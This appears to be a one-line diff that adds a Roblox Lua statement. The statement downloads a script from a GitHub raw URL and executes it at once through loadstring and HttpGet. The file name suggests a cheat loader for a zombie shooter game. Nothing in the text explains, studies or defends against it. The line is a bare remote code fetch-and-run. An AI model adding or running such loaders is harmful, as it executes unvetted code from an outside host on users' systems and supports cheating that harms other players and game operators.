@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/zombies-hypershot-spam1-oxkdd4m4o9oozc.lua"))()
